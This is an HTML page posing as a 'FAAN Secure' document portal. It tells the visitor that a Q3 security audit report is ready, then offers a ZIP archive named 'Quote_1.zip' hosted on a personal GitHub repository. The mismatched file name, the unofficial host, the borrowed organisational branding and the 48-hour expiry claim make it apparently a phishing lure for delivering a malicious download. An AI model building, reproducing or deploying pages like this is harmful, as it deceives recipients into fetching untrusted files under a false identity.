<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>FAAN – Document Portal</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #f0f4f9;
      font-family: 'Segoe UI', Roboto, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .portal {
      background: #ffffff;
      max-width: 780px;
      width: 100%;
      border-radius: 28px;
      box-shadow: 0 20px 40px -10px rgba(0,0,0,0.15);
      border: 1px solid #e2e8f0;
      padding: 40px 36px;
      text-align: center;
    }
    .header {
      border-bottom: 1px solid #e2e8f0;
      padding-bottom: 18px;
      margin-bottom: 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
    }
    .brand {
      font-size: 26px;
      font-weight: 700;
      color: #0b2a44;
      letter-spacing: -0.3px;
    }
    .brand span { color: #b22222; }
    .badge {
      background: #eef3f9;
      padding: 6px 16px;
      border-radius: 40px;
      font-size: 13px;
      color: #1f3a57;
    }
    .icon-large { font-size: 52px; margin-bottom: 10px; }
    .title {
      font-size: 22px;
      font-weight: 600;
      color: #0b1a2e;
      margin-bottom: 6px;
    }
    .sub {
      color: #4a627a;
      font-size: 16px;
      margin-bottom: 24px;
    }
    .doc-card {
      background: #f8fafc;
      border: 1px solid #dce4ec;
      border-radius: 16px;
      padding: 18px 16px;
      margin-bottom: 28px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 14px;
      flex-wrap: wrap;
    }
    .doc-card .label {
      background: #dce4ec;
      padding: 6px 14px;
      border-radius: 6px;
      font-size: 13px;
      font-weight: 600;
      color: #0b2a44;
    }
    .doc-card .name {
      font-weight: 500;
      color: #1f3a57;
      word-break: break-all;
    }
    .btn-download {
      background: #b22222;
      border: none;
      padding: 16px 48px;
      border-radius: 40px;
      color: #fff;
      font-weight: 600;
      font-size: 18px;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 6px 14px rgba(178, 34, 34, 0.3);
      display: inline-flex;
      align-items: center;
      gap: 12px;
      text-decoration: none;
      border: 1px solid #b22222;
    }
    .btn-download:hover {
      background: #8b1a1a;
      box-shadow: 0 8px 18px rgba(178, 34, 34, 0.4);
      transform: translateY(-2px);
    }
    .footer {
      margin-top: 28px;
      padding-top: 18px;
      border-top: 1px solid #e2e8f0;
      font-size: 13px;
      color: #6d7f94;
    }
    .disclaimer {
      font-size: 12px;
      color: #6d7f94;
      margin-top: 10px;
    }
  </style>
</head>
<body>

<div class="portal">
  <div class="header">
    <div class="brand">FAAN <span>Secure</span></div>
    <div class="badge">🔒 Secure Portal</div>
  </div>

  <div class="icon-large">📄</div>
  <div class="title">Document Ready for Download</div>
  <div class="sub">Please review the attached security audit report for Q3.</div>

  <div class="doc-card">
    <span class="label">📎 ZIP</span>
    <span class="name">Quote_1.zip</span>
    <span style="color:#4a627a; font-size:13px;">• 1.2 MB</span>
  </div>

  <!-- FILE IS Quote_1.zip — hosted in the new repo -->
  <a href="https://raw.githubusercontent.com/vxssroott/Quote_1/main/Quote_1.zip" download="Quote_1.zip" class="btn-download">
    ⬇ Download Document
  </a>

  <div class="footer">
    <span>🔒 Encrypted delivery • Expires in 48 hours</span><br>
    <span style="font-size:12px;">If you were not expecting this document, please contact IT Security.</span>
  </div>
</div>

</body>
</html>
